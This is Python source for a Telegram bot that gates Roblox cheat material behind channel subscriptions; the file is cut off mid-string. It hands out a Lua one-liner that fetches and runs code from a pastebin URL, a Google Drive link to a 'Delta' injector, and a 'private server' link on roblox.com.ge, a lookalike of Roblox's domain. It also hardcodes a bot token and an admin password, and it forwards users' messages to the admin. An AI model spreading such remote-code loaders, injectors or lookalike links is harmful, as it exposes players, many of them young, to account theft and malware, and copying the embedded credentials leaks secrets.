import telebot
import random
from telebot import types
import sqlite3
import os
import socket
from threading import Thread

TOKEN = os.environ.get("TOKEN", "8793302361:AAHCxbHJ6v_oCyjHqiafsHHaf7Xr1EvkDO8")
ADMIN_ID = 8091608667
ADMIN_SECRET = "larscriptkryyyyyyt"

DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_users.db")

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, lang TEXT DEFAULT 'ru')")
    conn.commit()
    conn.close()

def add_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    exists = c.fetchone()
    if not exists:
        c.execute("INSERT INTO users (user_id, lang) VALUES (?, 'ru')", (user_id,))
        conn.commit()
        conn.close()
        return True
    conn.close()
    return False

def set_lang(user_id, lang):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET lang = ? WHERE user_id = ?", (lang, user_id))
    conn.commit()
    conn.close()

def get_lang(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else 'ru'

def get_all_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id, lang FROM users")
    users = [(row[0], row[1]) for row in c.fetchall()]
    conn.close()
    return users

def count_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    count = c.fetchone()[0]
    conn.close()
    return count

def remove_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM users WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

init_db()

CHANNELS = [
    {"name": "freprivatka34", "url": "https://t.me/freprivatka34"},
    {"name": "freegodlymm2_67", "url": "https://t.me/freegodlymm2_67"},
    {"name": "keyscripts3", "url": "https://t.me/keyscripts3"}
]

KEYS = ["МОПС", "СКИТ", "ТАКСА", "КИТ", "LARS", "MOPS", "ARDOR", "MALTUIPY"]

PRIVATE_SERVER_LINK = "https://roblox.com.ge/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"
SCRIPT_LINK = "loadstring(game:HttpGet(\"https://pastebin.com/raw/GdQULgA6\"))()"
DELTA_LINK = "https://drive.google.com/file/d/1G2gniClYv0qV0BU9-xfYD4UOcxUljH4s/view?usp=sharing"

LANG = {
    "ru": {
        "lang_select": "Выберите язык / Choose language",
        "start": "😌 Чтобы продолжить пользоваться ботом, пожалуйста, выполни следующие задания!",
        "not_subscribed": "📢 Подпишитесь на каналы для получения скрипта и ключа",
        "check_sub_btn": "🔍 Проверить подписку",
        "check_again_btn": "🔍 Проверить снова",
        "sub_btn": "Подписаться ✅",
        "unsub_btn": "Подписаться ❎",
        "success_check": "✅ Подписка подтверждена!\n\nВыбери что хочешь получить:",
        "not_all_subs": "❌ Осталось подписаться:",
        "script_btn": "📜 Скрипт на все игры",
        "key_btn": "🔑 Ключ",
        "private_btn": "🔒 Приватный сервер MM2",
        "delta_btn": "📥 Скачать инжектор (Delta)",
        "script_text": "📜 Скрипт на все игры:\n\n```lua\n{script}\n```",
        "key_text": "🔑 Твой ключ:\n\n`{key}`\n\nСкопируй и вставь в скрипт.",
        "private_text": "🔒 Приватный сервер MM2\n\n{link}",
        "delta_text": "📥 Скачать Delta Injector:\n\n{link}",
        "new_user": "🆕 Новый пользователь!\n\n🆔 ID: `{uid}`\n👤 Имя: {name}\n📛 Username: @{uname}\n👥 Всего пользователей: {count}",
        "msg_to_admin": "💬 Новое сообщение в боте\n\n👤 {name}\n📛 @{uname}\n🆔 `{uid}`\n\n📩 Сообщение: {msg}",
        "admin_panel": "🛡 *Админ панель*\n\n👥 Пользователей: {users}\n📊 Каналов: {channels}\n🔑 Ключей: {keys}\n\nВыбери действие:",
        "admin_stats": "📊 *Статистика:*\n👥 Всего пользователей: {users}\n📊 Каналов: {channels}\n🔑 Ключей: {keys}",
        "admin_users_list": "👥 *Список пользователей ({count}):*\n\n{list}",
        "admin_no_users": "👥 Пользователей пока нет.",
        "admin_del_user_prompt": "🚫 Введи ID пользователя которого хочешь удалить:",
        "admin_del_user_ok": "✅ Пользователь {uid} удалён.",
        "admin_del_user_err": "❌ Неверный ID.",
        "admin_pm_prompt": "📨 Введи ID пользователя и сообщение:\nФормат: ID текст сообщения",
        "admin_pm_ok": "✅ Отправлено пользователю {uid}",
        "admin_pm_err": "❌ Неверный формат. Пример: 123456789 Привет!",
        "admin_pm_msg": "📨 *Сообщение от администратора:*\n\n{text}",
        "admin_list_channels": "📋 *Список каналов:*\n{list}",
        "admin_list_keys": "🔑 *Список ключей:*\n{list}",
        "admin_edit_keys_prompt": "🔑 Введи новые ключи через запятую:\nПример: КЛЮЧ1, КЛЮЧ2, КЛЮЧ3",
        "admin_edit_keys_ok": "✅ Ключи обновлены! Теперь их {count}:\n{list}",
        "admin_edit_link_prompt": "🔗 Введи новую ссылку на приватный сервер:",
        "admin_edit_link_ok": "✅ Ссылка на приватку обновлена!",
        "admin_edit_script_prompt": "📜 Введи новую ссылку на скрипт (pastebin):",
        "admin_edit_script_ok": "✅ Ссылка на скрипт обновлена!",
        "admin_edit_delta_prompt": "📥 Введи новую ссылку на Delta:",
        "admin_edit_delta_ok": "✅ Ссылка на Delta обновлена!",
        "admin_edit_start_prompt": "📝 Введи новый текст для приветствия:",
        "admin_edit_start_ok": "✅ Текст приветствия обновлён!",
        "admin_edit_notsub_prompt": "📢 Введи новый текст для неподписанных:",
        "admin_edit_notsub_ok": "✅ Текст для неподписанных обновлён!",
        "admin_add_channel_prompt": "➕ Введи данные канала:\nимя_канала | ссылка\nПример: mychannel | https://t.me/mychannel",
        "admin_add_channel_ok": "✅ Канал добавлен!",
        "admin_add_channel_err": "❌ Неверный формат. Пример: mychannel | https://t.me/mychannel",
        "admin_del_channel_title": "➖ Выбери канал для удаления:",
        "admin_del_channel_btn": "❌ @{name}",
        "admin_del_channel_ok": "✅ Канал @{name} удалён.",
        "admin_broadcast_prompt": "📨 Введи текст рассылки (получат {count} чел.)\nИли /skip для рассылки без текста:",
        "admin_broadcast_photo_prompt": "🖼 Отправь фото для рассылки (или /skip):",
        "admin_broadcast_photo_err": "❌ Отправь фото или /skip",
        "admin_broadcast_start": "📨 Начинаю рассылку на {count} пользователей...",
        "admin_broadcast_done": "✅ Рассылка завершена! Отправлено: {sent}/{total} пользователям.",
        "admin_photo_start_prompt": "🖼 Отправь фото для приветствия (или /skip чтобы убрать):",
        "admin_photo_start_ok": "✅ Фото для приветствия сохранено!",
        "admin_photo_start_del": "✅ Фото для приветствия убрано.",
        "admin_no_access": "❌ Нет доступа.",
        "admin_edit_start_btn": "📝 Приветствие",
        "admin_edit_notsub_btn": "📢 Не подписан",
        "admin_photo_start_btn": "🖼 Фото старт",
        "admin_add_channel_btn": "➕ Канал",
        "admin_del_channel_btn": "➖ Канал",
        "admin_list_channels_btn": "📋 Каналы",
        "admin_list_keys_btn": "🔑 Ключи",
        "admin_edit_keys_btn": "🔑 Изменить ключи",
        "admin_broadcast_btn": "📨 Рассылка",
        "admin_stats_btn": "📊 Статистика",
        "admin_users_list_btn": "👥 Пользователи",
        "admin_del_user_btn": "🚫 Удалить юзера",
        "admin_pm_btn": "📨 Личное сообщение",
        "admin_edit_link_btn": "🔗 Изменить прив.",
        "admin_edit_script_btn": "📜 Изменить скрипт",
        "admin_edit_delta_btn": "📥 Изменить Delta",
    },
    "en": {
        "lang_select": "Выберите язык / Choose language",
        "start": "😌 To continue using the bot, please complete the following tasks!",
        "not_subscribed": "📢 Subscribe to the channels to get the script and key",
        "check_sub_btn": "🔍 Check subscription",
        "check_again_btn": "🔍 Check again",
        "sub_btn": "Subscribe ✅",
        "unsub_btn": "Subscribe ❎",
        "success_check": "✅ Subscription confirmed!\n\nChoose what you want to get:",
        "not_all_subs": "❌ Still need to subscribe:",
        "script_btn": "📜 Script for all games",
        "key_btn": "🔑 Key",
        "private_btn": "🔒 Private server MM2",
        "delta_btn": "📥 Download Injector (Delta)",
        "script_text": "📜 Script for all games:\n\n```lua\n{script}\n```",
        "key_text": "🔑 Your key:\n\n`{key}`\n\nCopy and paste into the script.",
        "private_text": "🔒 Private server MM2\n\n{link}",
        "delta_text": "📥 Download Delta Injector:\n\n{link}",
        "new_user": "🆕 New user!\n\n🆔 ID: `{uid}`\n👤 Name: {name}\n📛 Username: @{uname}\n👥 Total users: {count}",
        "msg_to_admin": "💬 New message in bot\n\n👤 {name}\n📛 @{uname}\n🆔 `{uid}`\n\n📩 Message: {msg}",
        "admin_panel": "🛡 *Admin Panel*\n\n👥 Users: {users}\n📊 Channels: {channels}\n🔑 Keys: {keys}\n\nChoose action:",
        "admin_stats": "📊 *Stats:*\n👥 Total users: {users}\n📊 Channels: {channels}\n🔑 Keys: {keys}",
        "admin_users_list": "👥 *User list ({count}):*\n\n{list}",
        "admin_no_users": "👥 No users yet.",
        "admin_del_user_prompt": "🚫 Enter user ID to delete:",
        "admin_del_user_ok": "✅ User {uid} deleted.",
        "admin_del_user_err": "❌ Invalid ID.",
        "admin_pm_prompt": "📨 Enter user ID and message:\nFormat: ID message text",
        "admin_pm_ok": "✅ Sent to user {uid}",
        "admin_pm_err": "❌ Invalid format. Example: 123456789 Hello!",
        "admin_pm_msg": "📨 *Admin message:*\n\n{text}",
        "admin_list_channels": "📋 *Channel list:*\n{list}",
        "admin_list_keys": "🔑 *Key list:*\n{list}",
        "admin_edit_keys_prompt": "🔑 Enter new keys separated by commas:\nExample: KEY1, KEY2, KEY3",
        "admin_edit_keys_ok": "✅ Keys updated! Now {count}:\n{list}",
        "admin_edit_link_prompt": "🔗 Enter new private server link:",
        "admin_edit_link_ok": "✅ Private server link updated!",
        "admin_edit_script_prompt": "📜 Enter new script link (pastebin):",
        "admin_edit_script_ok": "✅ Script link updated!",
        "admin_edit_delta_prompt": "📥 Enter new Delta link:",
        "admin_edit_delta_ok": "✅ Delta link updated!",
        "admin_edit_start_prompt": "📝 Enter new welcome text:",
        "admin_edit_start_ok": "✅ Welcome text updated!",
        "admin_edit_notsub_prompt": "📢 Enter new text for unsubscribed:",
        "admin_edit_notsub_ok": "✅ Text for unsubscribed updated!",
        "admin_add_channel_prompt": "➕ Enter channel data:\nchannel_name | link\nExample: mychannel | https://t.me/mychannel",
        "admin_add_channel_ok": "✅ Channel added!",
        "admin_add_channel_err": "❌ Invalid format. Example: mychannel | https://t.me/mychannel",
        "admin_del_channel_title": "➖ Select channel to delete:",
        "admin_del_channel_btn": "❌ @{name}",
        "admin_del_channel_ok": "✅ Channel @{name} deleted.",
        "admin_broadcast_prompt": "📨 Enter broadcast text ({count} users)\nOr /skip for broadcast without text:",
        "admin_broadcast_photo_prompt": "🖼 Send photo for broadcast (or /skip):",
        "admin_broadcast_photo_err": "❌ Send photo or /skip",
        "admin_broadcast_start": "📨 Starting broadcast to {count} users...",
        "admin_broadcast_done": "✅ Broadcast complete! Sent: {sent}/{total} users.",
        "admin_photo_start_prompt": "🖼 Send photo for welcome (or /skip to remove):",
        "admin_photo_start_ok": "✅ Welcome photo saved!",
        "admin_photo_start_del": "✅ Welcome photo removed.",
        "admin_no_access": "❌ Access denied.",
        "admin_edit_start_btn": "📝 Welcome",
        "admin_edit_notsub_btn": "📢 Unsubscribed",
        "admin_photo_start_btn": "🖼 Photo Welcome",
        "admin_add_channel_btn": "➕ Channel",
        "admin_del_channel_btn": "➖ Channel",
        "admin_list_channels_btn": "📋 Channels",
        "admin_list_keys_btn": "🔑 Keys",
        "admin_edit_keys_btn": "🔑 Edit Keys",
        "admin_broadcast_btn": "📨 Broadcast",
        "admin_stats_btn": "📊 Stats",
        "admin_users_list_btn": "👥 Users",
        "admin_del_user_btn": "🚫 Delete User",
        "admin_pm_btn": "📨 PM",
        "admin_edit_link_btn": "🔗 Edit Private",
        "admin_edit_script_btn": "📜 Edit Script",
        "admin_edit_delta_btn": "📥 Edit Delta",
    }
}

MESSAGES = {
    "broadcast_text": ""
}

PHOTOS = {
    "start": None
}

bot = telebot.TeleBot(TOKEN)

def t(user_id, key, **kwargs):
    lang = get_lang(user_id)
    text = LANG.get(lang, LANG["ru"]).get(key, key)
    return text.format(**kwargs)

def notify_admin(text):
    try:
        bot.send_message(ADMIN_ID, text, parse_mode="Markdown")
    except:
        pass

def is_admin(user_id):
    return user_id == ADMIN_ID

def get_unsubscribed_channels(user_id):
    not_subbed = []
    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(f"@{ch['name']}", user_id)
            if member.status not in ["member", "administrator", "creator"]:
                not_subbed.append(ch)
        except:
            not_subbed.append(ch)
    return not_subbed

def get_lang_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru"),
        types.InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")
    )
    return keyboard

def get_channels_keyboard(user_id):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for ch in CHANNELS:
        keyboard.add(types.InlineKeyboardButton(
            text=f"{t(user_id, 'sub_btn')} {ch['name']}",
            url=ch['url']
        ))
    keyboard.add(types.InlineKeyboardButton(
        text=t(user_id, "check_sub_btn"),
        callback_data="check_sub"
    ))
    return keyboard

def get_unsub_keyboard(not_subbed, user_id):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for ch in not_subbed:
        keyboard.add(types.InlineKeyboardButton(
            text=f"{t(user_id, 'unsub_btn')} {ch['name']}",
            url=ch['url']
        ))
    keyboard.add(types.InlineKeyboardButton(
        text=t(user_id, "check_again_btn"),
        callback_data="check_sub"
    ))
    return keyboard

def get_success_keyboard(user_id):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(types.InlineKeyboardButton(
        text=t(user_id, "script_btn"),
        callback_data="get_script"
    ))
    keyboard.add(types.InlineKeyboardButton(
        text=t(user_id, "key_btn"),
        callback_data="get_key"
    ))
    keyboard.add(types.InlineKeyboardButton(
        text=t(user_id, "private_btn"),
        callback_data="get_private"
    ))
    keyboard.add(types.InlineKeyboardButton(
        text=t(user_id, "delta_btn"),
        url=DELTA_LINK
    ))
    return keyboard

def get_admin_keyboard(user_id):
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton(t(user_id, "admin_edit_start_btn"), callback_data="admin_edit_start"),
        types.InlineKeyboardButton(t(user_id, "admin_edit_notsub_btn"), callback_data="admin_edit_notsub")
    )
    keyboard.add(
        types.InlineKeyboardButton(t(user_id, "admin_photo_start_btn"), callback_data="admin_photo_start"),
        types.InlineKeyboardButton(t(user_id, "admin_add_channel_btn"), callback_data="admin_add_channel")
    )
    keyboard.add(
        types.InlineKeyboardButton(t(user_id, "admin_del_channel_btn"), callback_data="admin_del_channel"),
        types.InlineKeyboardButton(t(user_id, "admin_list_channels_btn"), callback_data="admin_list_channels")
    )
    keyboard.add(
        types.InlineKeyboardButton(t(user_id, "admin_list_keys_btn"), callback_data="admin_list_keys"),
        types.InlineKeyboardButton(t(user_id, "admin_edit_keys_btn"), callback_data="admin_edit_keys")
    )
    keyboard.add(
        types.InlineKeyboardButton(t(user_id, "admin_broadcast_btn"), callback_data="admin_broadcast"),
        types.InlineKeyboardButton(t(user_id, "admin_stats_btn"), callback_data="admin_stats")
    )
    keyboard.add(
        types.InlineKeyboardButton(t(user_id, "admin_users_list_btn"), callback_data="admin_users_list"),
        types.InlineKeyboardButton(t(user_id, "admin_del_user_btn"), callback_data="admin_del_user")
    )
    keyboard.add(
        types.InlineKeyboardButton(t(user_id, "admin_pm_btn"), callback_data="admin_pm"),
        types.InlineKeyboardButton(t(user_id, "admin_edit_link_btn"), callback_data="admin_edit_link")
    )
    keyboard.add(
        types.InlineKeyboardButton(t(user_id, "admin_edit_script_btn"), callback_data="admin_edit_script"),
        types.InlineKeyboardButton(t(user_id, "admin_edit_delta_btn"), callback_data="admin_edit_delta")
    )
    return keyboard

@bot.message_handler(commands=["start"])
def start(message):
    add_user(message.from_user.id)
    bot.send_message(message.chat.id, LANG["ru"]["lang_select"], reply_markup=get_lang_keyboard())

@bot.callback_query_handler(func=lambda call: call.data.startswith("lang_"))
def lang_callback(call):
    lang = call.data.replace("lang_", "")
    set_lang(call.from_user.id, lang)
    user = call.from_user
    text = t(call.from_user.id, "new_user", uid=user.id, name=user.first_name, uname=user.username or "нет", count=count_users())
    notify_admin(text)
    if PHOTOS["start"]:
        bot.send_photo(call.message.chat.id, PHOTOS["start"], caption=t(call.from_user.id, "start"), reply_markup=get_channels_keyboard(call.from_user.id))
    else:
        bot.send_message(call.message.chat.id, t(call.from_user.id, "start"), reply_markup=get_channels_keyboard(call.from_user.id))
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda m: not m.text.startswith("/") and m.text != ADMIN_SECRET and m.from_user.id != ADMIN_ID)
def catch_messages(message):
    user = message.from_user
    text = t(ADMIN_ID, "msg_to_admin", name=user.first_name, uname=user.username or "нет", uid=user.id, msg=message.text)
    notify_admin(text)

@bot.message_handler(commands=["getkey"])
def getkey(message):
    add_user(message.from_user.id)
    not_subbed = get_unsubscribed_channels(message.from_user.id)
    if not not_subbed:
        key = random.choice(KEYS)
        bot.send_message(message.chat.id, t(message.from_user.id, "key_text", key=key), parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, t(message.from_user.id, "not_subscribed"), reply_markup=get_unsub_keyboard(not_subbed, message.from_user.id))

@bot.message_handler(func=lambda m: m.text == ADMIN_SECRET)
def admin_panel(message):
    if not is_admin(message.from_user.id):
        return
    text = t(message.from_user.id, "admin_panel", users=count_users(), channels=len(CHANNELS), keys=len(KEYS))
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=get_admin_keyboard(message.from_user.id))

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def admin_callback(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, t(call.from_user.id, "admin_no_access"))
        return
    action = call.data
    uid = call.from_user.id
    
    if action == "admin_stats":
        bot.send_message(call.message.chat.id, t(uid, "admin_stats", users=count_users(), channels=len(CHANNELS), keys=len(KEYS)), parse_mode="Markdown")
    
    elif action == "admin_users_list":
        users = get_all_users()
        if not users:
            bot.send_message(call.message.chat.id, t(uid, "admin_no_users"))
        else:
            text = "\n".join(f"• `{u[0]}` ({u[1]})" for u in users[:50])
            more = f"\n... и ещё {len(users) - 50}" if len(users) > 50 else ""
            bot.send_message(call.message.chat.id, t(uid, "ad
